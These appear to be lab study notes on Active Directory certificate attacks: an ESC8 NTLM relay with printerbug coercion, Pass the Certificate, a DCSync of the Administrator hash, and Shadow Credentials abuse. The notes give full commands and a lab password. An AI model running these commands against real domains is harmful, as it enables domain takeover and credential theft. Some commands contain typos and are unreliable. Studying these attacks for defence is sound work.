- ==`PKINIT`== is the short for ==`Public Key Cryptography for Initial Authentication`==
- It is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange.
- It is used to support user logons via smart cards, which stores the private keys.
- Pass the Certificate refers to the technique of using ==`X.509`== certificates to successfully obtain ==`TGTs`==

## AD CS NTLM Relay Attack(ESC8):

- ESC-8 is an NTLM relay attack targeting an ADCS HTTP endpoint.
	- ADCS supports multiple enrollment methods, including web enrollment, which by default occurs over HTTP.
- A certificate authority configured to allow web enrollment typically hosts the application at `/CertSrv`
- Attackers can use ==`Impacket's ntlmrelayx`== to listen for inbound connection and relay them to the web enrollment service.
	- Command:
		
		- `impacket-ntlmrelayx -t <web_Address/certsrv/certfnsh.<domain>> --adcs -smb2support --template KerberosAuthentication`
		
		- The value passed to ==`--template`== may be different in other environments.
		- This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy)
	
- Attacker can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so.
- It can also be done by using  [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). 
	
	- This attack requires the targeted machine account to have the Printer Spooler service running. 
	- `Command`:
		
		- `python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12`
		- This command forces 10.129.234.109 to attempt authentication against 10.10.16.12
		
	- After getting the Certificate from the the tool `ntlmrelayx.py`
		- Now we can perform a Pass the Certificate attack to obtain a TGT a Systems name.
		- To do this we can use [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
		- `Command`:
			
			- `git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools`
			- `python3 -m venv .venv`
			- `source .venv/bin/activate`
			- `pip3 install -r requirements.txt`
	
	- After getting the certificate issued by the tool `ntlmrelayx.py` and having all other setups configured the we can begin the attack.
		
		-  If you encounter error stating `"Error detecting the version of libcrypto"`, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.
		
		- `Command`:
			
			-  `pip3 install -I git+https://github.com/wbond/oscrypto.git`
			
			- `python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache`
		
		- Once after obtaining a TGT. As the domain controller's machine account, perform a `DCSync` attack to retrieve the NTLM hash of the domain administrator
			
			- `export KRB5CCNAME = /tmp/dc.ccache`
			- `impacket-secretedump -k -no-pass -dc-ip <target_add> -just-dc-user Administrator '<domain_name_with_machine_name>'`

## Shadow Credential (msDS-KeyCredentialLink):

- ==`Shadow Credentials`== refers to an Active Directory attack that abuses the `msDS-KeyCredentialLink` attribute of a victim user.
- This attribute stores public keys that can be used for authentication via PKINIT.
- In ==`BloodHound`==, the ==`AddkeyCredentialLink`== edge indicates that one user has write permissions over another user's `msDS-keyCredentiaLink` attributer allowing them to take control of that user.
- A attacker can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from Linux system.
	
	- `Command`: 
		
		- `pywhisker -dc-ip <target_add> -d <Domain_name> -u <compromised_user_name> -p <pass_word> --target <victim_user_name> --action add`
	
	- It generates an ==`X.509`== certificate and writes the public key to the victim user's `msDS-KeyCredentialLink` attribute.
	- After getting the X.509 certificate then convert it to ticket using ==`gettgtkinit.py`== 
		
		- Command:
			
			- `python3 gettgtpkinit.py -cert-pfx ../<key_path> -pfx-pass '<password_phrase>' -dc-ip <target_add> <Domain_name/victim_user> <ticket_path>` 
			- `export KRB5CCNAME = /<ticket_path>`
	
	- Connect to the victim  using Kerberos `Evil-WinRM`:
		
		- Ensure that the `krb5.conf` is properly configured.
		
		- `Command`:
			
			- `evil-winrm -i <system.Domain_name> -r <domain_name>` 